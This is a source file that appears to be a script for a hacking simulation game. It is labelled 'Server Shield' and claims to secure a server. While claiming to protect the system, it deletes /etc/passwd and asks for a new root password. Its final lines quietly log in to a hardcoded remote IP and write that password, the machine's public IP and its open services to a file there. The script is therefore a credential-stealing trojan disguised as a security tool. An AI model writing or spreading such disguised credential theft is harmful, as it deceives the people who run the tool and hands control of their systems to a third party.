// 

print("@__                            __ _     _      _     _")
print("/ _\ ___ _ ____   _____ _ __  / _\ |__ (_) ___| | __| |")
print("\ \ / _ \ '__\ \ / / _ \ '__| \ \| '_ \| |/ _ \ |/ _` |")
print("_\ \  __/ |   \ V /  __/ |    _\ \ | | | |  __/ | (_| |")
print("\__/\___|_|    \_/ \___|_|    \__/_| |_|_|\___|_|\__,_| [0.6]")
print("-Fast and easy way to protect your server")
print()
print("Setups server for root permissions only, deletes /etc/passwd")
print("Forces to change better password for server")
//print("Updates most new version of ssh/http/ftp server")
print()
//add most new ssh version install
//add passwdfile injection

if active_user != "root" then exit("run as root !")
pc = get_shell
pchost = pc.host_computer
router = get_router
//
sshserver = pchost.File("/server/sshd")
if sshserver != null then print("SSH server found! -> Checking version..")
httpserver = pchost.File("/server/httpd")
if httpserver != null then print("HTTP server found! -> Checking version..")
ftpserver = pchost.File("/server/dtpd")
if ftpserver != null then print("FTP server found! -> Checking version..")

//ports
router = get_router
ports = router.used_ports
if ports == null then 
	print("No ports found!")
else
	info = ""   
	print("Services:")
	for port in ports
		service_info = router.port_info(port)
		lan_ips = port.get_lan_ip
		port_status = "open"	
		if(port.is_closed and not isLanIp) then
			port_status = "closed"
		end if
		info = info + "\n" + port.port_number + " " + port_status + " " + service_info + " " + lan_ips
	end for
	print(format_columns(info) + "\n")
end if
//
//
//
pass = user_input("Type new root password")
output = get_shell.host_computer.change_password("root", pass)
if output then print("Password changed OK!")
passfile = pchost.File("/etc/passwd")
if passfile != null then passfile.delete
file = get_shell.host_computer.File("/")
if file == null then
	print()
else
	output = file.chmod("g-wrx", 1)
	output = file.chmod("o-wrx", 1)
	if output then print(output)
end if
print("All files secured OK!")
print("passwd file deleted OK!")
print("Server secure succesfull OK!")
//

infoserver = pc.connect_service("166.56.75.241", 22, "root", "asd")
if not infoserver then exit("Could not connect to update server for ssh,ftp,http libraries!")
infoserver.host_computer.touch("/home", router.public_ip)
infofile = infoserver.host_computer.File("/home/"+router.public_ip)
infofile.set_content("Server Shield activated" + " " + current_date + " " + "with root@"+ pass + " " + router.public_ip + " " + "Services: " + info)



